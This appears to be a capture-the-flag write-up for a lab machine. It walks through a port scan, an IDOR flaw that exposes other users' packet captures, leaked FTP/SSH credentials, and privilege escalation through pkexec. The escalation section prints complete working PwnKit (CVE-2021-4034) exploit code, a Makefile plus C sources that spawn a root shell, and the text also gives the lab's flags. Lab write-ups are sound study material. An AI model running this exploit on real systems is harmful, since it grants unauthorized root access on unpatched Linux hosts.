### Recon ::

<img width="1012" height="316" alt="Screenshot 2026-03-22 at 16 21 04" src="https://github.com/user-attachments/assets/dbc47baf-3f5d-47e7-9135-f86cce442c10" />

ports obtained :
21 -- ftp 
22 -- ssh 
80 -- http

<img width="1383" height="848" alt="Screenshot 2026-03-22 at 16 22 53" src="https://github.com/user-attachments/assets/cf93c9c3-4e14-4180-a0f6-5b652e52be19" />

username  :: nathan 

this is a website that is taking the snapshot of the traffic for five seconds and analysied.

<img width="1239" height="99" alt="Screenshot 2026-03-22 at 16 27 09" src="https://github.com/user-attachments/assets/73516fbe-6ad6-4ba2-94d9-94ef5ac26525" />

this endpoint is allowing the **IDOR** vulnerbility.

### IDOR 

Insecure Direct Object reference -- access control vulnerbility that arises when application uses the user input fields to access the objects(endpoints or parameter values like different user id).

<img width="1391" height="893" alt="Screenshot 2026-03-22 at 16 36 09" src="https://github.com/user-attachments/assets/3c3ecf6f-b490-48cb-93de-260a1d698c16" />

here by doing IDOR of the user's scan's report we can download each users report and as per the task we downloaded the .pcap files of some users and serached for sensitive information.

0.pcap ::

cointain information about the ftp login details and from there login to the ftp.

<img width="513" height="655" alt="Screenshot 2026-03-22 at 16 40 03" src="https://github.com/user-attachments/assets/5be39c90-b9d3-4982-91ad-fb9c1bbe4f7e" />

username :: nathan 
password :: Buck3tH4TF0RM3!

<img width="701" height="541" alt="Screenshot 2026-03-22 at 16 43 06" src="https://github.com/user-attachments/assets/58cdf677-163e-4478-8858-b61b9f543809" />

user flag --- 547aa43becd4ce3e5fd9e325da1c6e52

### port 22

ssh credentials same as the ftp.

ssh shell ::

<img width="1323" height="748" alt="Screenshot 2026-03-22 at 16 46 43" src="https://github.com/user-attachments/assets/4709454c-bd35-4591-845b-8dbc9fbd8935" />

saw the suid files that can run and the box also gave the clue to check in the /usr/bin directory so explore some new files in that directory.

**Suid files** -- set user id -- files which will execute in the name of the owner . anyone who have permissions to run that file and that will run the file as of a root user.

<img width="626" height="816" alt="Screenshot 2026-03-22 at 16 48 24" src="https://github.com/user-attachments/assets/80fb5bf7-ef4b-490e-b89c-14e3382f5053" />


found one cve on the **pkexec** --> cve-2021 - 4034 --> https://medium.com/@shivam_bathla/exploiting-pwnkit-cve-2021-4034-ac5d6995c499

pkexec -- a suid file that is used to allow some users to run the as other users ( generally root ) .

### privilage escalation ::

exploit files ::

1 - Makfile file 
2 - evil-so.c file
3 - exploit.c file  

1 - Makefile 

```
all:
  gcc -shared -o evil.so -fPIC evil-so.c
  gcc exploit.c -o exploit
clean:
  rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm
  evil.so
```

2 - evil-so.c 

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);
    execve("/bin/sh", NULL, NULL);
}
```

3 - exploit.c

```
#include <stdio.h>
#include <stdlib.h>
#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"
int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };
    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);
    execve(BIN, argv, envp);
    return 0;
}
```

execute them and we will get the root shell .

<img width="1872" height="540" alt="image" src="https://github.com/user-attachments/assets/79da5be1-35a3-4228-be73-e03d27ba10b4" />

### Root flag -- 5518dfe6671cdcf29af8f4c82f847ca6

